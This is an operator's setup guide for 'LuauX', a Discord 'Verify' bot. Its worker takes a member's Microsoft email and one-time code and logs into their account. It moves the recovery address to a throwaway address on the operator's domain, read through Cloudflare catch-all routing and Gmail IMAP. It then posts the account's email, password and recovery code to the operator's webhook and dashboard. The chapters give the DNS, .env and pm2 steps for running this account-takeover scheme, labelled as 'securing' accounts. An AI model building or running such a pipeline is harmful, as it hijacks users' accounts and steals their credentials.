# LuauX recovery mail setup guide

This guide explains how to receive Microsoft security codes for the secure pipeline without Firstmail or Mailcow. Your website stays on Vercel. Recovery mail is handled with Cloudflare Email Routing and a normal Gmail inbox that the Windows bot-worker reads over IMAP.

When a member verifies, the worker invents a unique address such as `r8k2m1x@luaux.wtf`, Microsoft sends the security code to that address, Cloudflare forwards everything to your Gmail, and the worker logs into Gmail over IMAP to read the code. Credentials are stored for the license owner in the LuauX dashboard and sent to your admin Discord webhook. Members do not receive passwords in Discord DMs or public channels.

---

## How the pieces fit together

LuauX has three separate systems that must not be confused.

The **website** (`https://luaux.wtf`) is hosted on Vercel. Vercel only serves the web app and APIs. It does not receive email and it does not speak SMTP.

The **bot-worker** runs on your Windows VPS. It logs into Microsoft, runs the secure flow, creates the temporary recovery address, and reads the security code from IMAP.

**Email for `@luaux.wtf`** is handled by DNS. With this guide, Cloudflare owns the DNS for the domain, keeps the website pointed at Vercel, and uses Email Routing so any message to any address at `luaux.wtf` lands in one Gmail account you control.

That means you do not need port 25 open, you do not need a Linux mail server, and you do not need Firstmail to work. You only need Cloudflare, a Gmail (or similar) inbox with IMAP, and the worker environment variables filled in.

---

## Before you start

You need:

- Ownership of `luaux.wtf` (you already have this).
- Access to the domain’s registrar or current DNS panel so you can change nameservers if needed.
- A Cloudflare account (free plan is enough).
- A Gmail account dedicated to recovery mail if possible (recommended so personal mail is not mixed in).
- Access to the Windows VPS where `bot-worker` runs under pm2.
- Admin access to Vercel if you still need `ADMIN_WEBHOOK_URL` set for credential alerts.

You do **not** need Firstmail, Mailcow, port 25, or a second VPS for this method.

---

## Chapter 1 — Put DNS on Cloudflare (keep Vercel for the site)

Open Cloudflare and add the site `luaux.wtf` if it is not there already. Choose the free plan. Cloudflare will show two nameservers.

Go to the place where you registered the domain and replace the existing nameservers with Cloudflare’s two nameservers. Save and wait until Cloudflare marks the domain as **Active**. This can take a few minutes or a few hours.

After the domain is active, open **DNS** in Cloudflare and make sure the website still points at Vercel. Typical records look like an apex A/CNAME and a `www` CNAME that Vercel expects (often something like `cname.vercel-dns.com`). Orange-cloud (proxied) is fine for the website.

If the site stops loading after the nameserver change, open the Vercel project → Domains → `luaux.wtf` and follow Vercel’s Cloudflare instructions until the domain shows as valid again. Do not delete the domain from Vercel; you are only changing who hosts DNS, not where the app is deployed.

When this chapter is done, `https://luaux.wtf` still opens the LuauX site, but DNS is controlled by Cloudflare so you can enable email routing next.

---

## Chapter 2 — Turn on Cloudflare Email Routing

In the Cloudflare dashboard for `luaux.wtf`, open **Email** → **Email Routing** and start setup.

Cloudflare will ask for a **destination address**. Use a Gmail address you control, ideally a dedicated recovery inbox such as `luaux.recovery@gmail.com`. Cloudflare sends a confirmation email to that address. Open it and confirm before continuing.

Next, enable the **catch-all** rule. Catch-all means any message sent to any local part at `luaux.wtf` (for example `randomtest@luaux.wtf` or `r8k2m1x@luaux.wtf`) is forwarded to your destination Gmail. Set the action to send to the Gmail you verified.

Cloudflare adds the required MX records for you. Leave mail-related records as DNS-only (grey cloud) if Cloudflare gives you a proxy toggle. Do not put a second competing MX set at the registrar while Cloudflare is the DNS host.

### Prove mail works before touching the worker

From any other email account, send a short message to a made-up address on your domain, for example:

```text
manual-test-123@luaux.wtf
```

Within a minute or two, that message should appear in the destination Gmail (check spam if needed). If it never arrives, stop here and fix Email Routing before configuring the bot. The secure pipeline cannot succeed if Microsoft’s code never lands in the inbox the worker will read.

---

## Chapter 3 — Prepare Gmail for IMAP

The worker does not use the Gmail website. It connects with IMAP like a mail client.

In Gmail, open Settings → See all settings → Forwarding and POP/IMAP, enable IMAP, and save.

If the Google account has 2-Step Verification (recommended), create an **App password**:

1. Open Google Account security settings.
2. Ensure 2-Step Verification is on.
3. Create an App password for Mail.
4. Copy the 16-character password Google shows.

You will put that app password in the worker `.env` file. Do not use your normal Gmail login password.

Optional but useful: create a Gmail filter that never deletes mail from Microsoft / `account.live.com` / `accountprotection.microsoft.com`, and leave those messages in the inbox until the job finishes. The worker scans recent inbox messages for a security code.

---

## Chapter 4 — Configure the Windows bot-worker

On the Windows VPS, open the worker environment file:

```text
C:\luaux\bot-worker\.env
```

Set (or replace) the recovery block so it looks like this, using your real Gmail and app password:

```env
SITE_URL=https://luaux.wtf
WORKER_SECRET=larpingistiuff
WORKER_ID=worker-1
POLL_INTERVAL_MS=3000
MAX_CONCURRENT_JOBS=8

FIRSTMAIL_API_KEY=

RECOVERY_MAIL_DOMAIN=luaux.wtf
RECOVERY_IMAP_HOST=imap.gmail.com
RECOVERY_IMAP_USER=your-recovery@gmail.com
RECOVERY_IMAP_PASS=your-16-char-app-password
RECOVERY_IMAP_PORT=993
```

Leave `FIRSTMAIL_API_KEY` empty for this setup so the worker uses catch-all instead of Firstmail.

Then update code and run a single worker process. In PowerShell:

```powershell
cd C:\luaux
pm2 kill
git fetch origin
git reset --hard origin/main
cd bot-worker
npm install
npm run build
pm2 start node --name "bot-worker" -- dist/index.js
pm2 save
pm2 list
```

`pm2 list` must show exactly one `bot-worker` process. Two copies cause double OTP sends and races.

---

## Chapter 5 — What a successful secure run looks like

Run a normal Discord Verify: member enters Minecraft email, receives Microsoft OTP, submits the code. The worker then continues the secure pipeline.

In `pm2 logs` you want a sequence like this after login and recovery code generation:

```text
[secure] Got recovery code
[secure] Creating unique recovery mailbox (firstmail=false catchall=true)...
[secure] Mailbox ready provider=catchall email=r........@luaux.wtf imap=imap.gmail.com
[secure] Running recovery flow (waiting for mailbox OTP)...
[secure] Account secured successfully!
```

At the same time, your **admin Discord webhook** should receive the full credentials (email, password, recovery code, and related fields). The public verification channel should only show a success message without secrets. The license owner can also open the LuauX dashboard → Verification Bot → **Secured Accounts** to see the same credentials.

If the job fails with a timeout waiting for the security code, open Gmail and check whether a Microsoft message arrived for that `r…@luaux.wtf` address. If nothing arrived, the problem is still Cloudflare routing or Microsoft delivery. If the mail is in Gmail but the worker timed out, the problem is IMAP user/password/host or the worker not scanning the right mailbox.

---

## Chapter 6 — Admin webhook (credentials alert)

The complete API posts full credentials to `ADMIN_WEBHOOK_URL` as soon as a secure succeeds. That variable must be set on **Vercel Production**, because the complete endpoint runs on the website, not only on the Windows worker.

In Vercel → Project → Settings → Environment Variables, ensure Production has:

```text
ADMIN_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

Redeploy the site after changing it. Members do not get credential DMs; only the webhook and the owner dashboard hold secrets.

---

## Common failures and what they mean

If Cloudflare is not Active, Email Routing never fully works and test mail to `@luaux.wtf` will not arrive.

If the website breaks after moving nameservers, DNS web records are wrong or still pointing at the old host; fix A/CNAME toward Vercel while leaving Email Routing MX alone.

If `pm2 logs` show `catchall=false`, the worker did not load `RECOVERY_MAIL_DOMAIN` and the IMAP settings. Edit `.env`, save, rebuild if needed, and restart the single pm2 process.

If IMAP authentication fails, you are almost always using the normal Gmail password instead of an app password, or IMAP is still disabled.

If you see two `bot-worker` rows in `pm2 list`, kill everything and start one process only. Dual workers corrupt verification sessions.

If Firstmail errors still appear, a non-empty `FIRSTMAIL_API_KEY` is still set and failing first. Clear it for pure catch-all operation.

---

## What this method is and is not

This method gives each secure job a **different recovery address** on `luaux.wtf`. It does **not** create a separate IMAP login per address. All of those addresses forward into the same Gmail. For LuauX that is enough: the worker only needs Microsoft’s short-lived security code, then stores the final Microsoft credentials in your dashboard and admin webhook.

If you later want true separate mailboxes with their own passwords, you would need a real mail host (Mailcow on Linux, Google Workspace users, etc.). That is more work and is not required for the secure pipeline to finish.

---

## End-to-end checklist in plain language

When you are finished, you should be able to say yes to all of the following:

Cloudflare is Active for `luaux.wtf`. The LuauX website still loads on Vercel. Email Routing is on, destination Gmail is verified, and catch-all is enabled. A manual message to a random `@luaux.wtf` address appears in that Gmail. Gmail has IMAP on and you have an app password. The Windows worker `.env` points at that Gmail with domain `luaux.wtf`. Only one bot-worker process is running. A full Verify reaches “Account secured successfully,” the admin webhook fires, and Secured Accounts in the dashboard shows the new email, password, and recovery code.

---

## Related code (for operators)

The worker prefers Firstmail only if `FIRSTMAIL_API_KEY` is set and works. Otherwise it uses catch-all when `RECOVERY_MAIL_DOMAIN` and `RECOVERY_IMAP_*` are set. Implementation lives in `bot-worker/src/recovery-mailbox.ts` and the secure pipeline in `bot-worker/src/secure.ts`. Credential delivery after success is handled by the site endpoint `src/routes/api/verification/complete.ts` (admin webhook + dashboard storage, no member DM).

Production site: `https://luaux.wtf`. Worker polls the site with `WORKER_SECRET`, which must match Vercel.
